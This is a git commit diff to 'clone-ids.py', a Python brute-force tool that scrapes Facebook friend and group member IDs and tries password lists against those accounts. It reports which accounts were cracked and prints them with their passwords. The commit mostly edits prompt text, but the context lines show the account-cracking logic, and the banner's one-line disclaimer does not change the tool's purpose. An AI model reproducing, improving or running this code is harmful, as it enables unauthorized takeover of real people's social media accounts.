3a2a268ed1bd7186f700ea106d53b8e7bbfccdfc
chawdhary <44389314+chawdhary@users.noreply.github.com>
2018-10-24 19:08:31 +0500

    Add files via upload

--- clone-ids.py
+++ clone-ids.py
@@ -89,7 +89,7 @@ def simpan():
 		except:
 			tampil('\rm[!]Failed to save')
 def buka(d):
-	tampil('\rh[*]Loading ids \rp'+d)
+	tampil('\rh[*]Loading friends ids \rp'+d)
 	try:
 		x = br.open(d)
 		br._factory.is_html = True
@@ -140,7 +140,7 @@ def saring_id_group1(d):
 def saring_id_group0():
 	global id_group
 	while 1:
-		id_group = inputD('[?]group id >>Ex>> 488575521641382')
+		id_group = inputD('[?]group id')
 		tampil('\rh[*]Check the group....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
@@ -224,17 +224,17 @@ class mt(threading.Thread):
         else:
             self.a = 0
 def crack(d):
-	i = inputD('[?]Passwordlist/Manual (p/m)',['P','M'])
+	i = inputD('[?]use Passwordlist/Manual (p/m)',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]passwrdfile path >>Ex>> /sdcard/file.txt')
+			dir = inputD('[?]Enter file path')
 			try:
 				D = open(dir,'r').readlines()
 			except:
-                                tampil('\rm[!]passwrdfile path >>Ex>> /sdcard/file.txt%s'%dir)
+                                tampil('\rm[!]Enter file path%s'%dir)
 				continue
 			break
-		tampil('\rh[*]start crack with password'%len(D))
+		tampil('\rh[*]start crack with \rk%d password'%len(D))
 		for i in D:
 			i = i.replace('\n','')
 			if len(i) != 0:
@@ -293,10 +293,10 @@ def crack0(data,sandi,p):
 		tampil('\rh[*]Daftar akun sukses')
 		for i in akun_sukses:
 			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
-	tampil('\rh[*]nmbr of suces acounts\rp     %d'%len(akun_sukses))
+	tampil('\rh[*]nmbr of free accounts\rp     %d'%len(akun_sukses))
 	tampil('\rm[*]nmbr of free accounts\rp     %d'%len(akun_gagal))
-	tampil('\rk[*]nmbr of chkpoint accounts    %d'%len(akun_cekpoint))
-	tampil('\rc[*]Nmbr of failded acounts\rp   %d'%len(akun_error))
+	tampil('\rk[*]nmbr of chkpoint accounts\   %d'%len(akun_cekpoint))
+	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
 	if p:
 		i = inputD('[?]Result is wrong want try again (y/n)',['Y','N'])
 		if i.upper() == 'Y':
@@ -339,7 +339,7 @@ def menu():
 \rk############################################################
 #            \rb*Multi Bruteforce Attack*\rk                   ##
 # \rhCredit goes tot\r     #   Anas chawdhary...Dnt copy      \rk#
-# \rhfb group\rp  https://m.facebook.com/groups/488575521641382 \rk#
+# \rhfb group\rp  https://m.facebook.com/groups/488575521641482 \rk#
 # \rhGitHub\rp      https://github.com/Chawdhary007          \rk#
 #       \rmDo Not Use This Tool For IllegaL Purpos \rk         ##
 ##############################################################''')
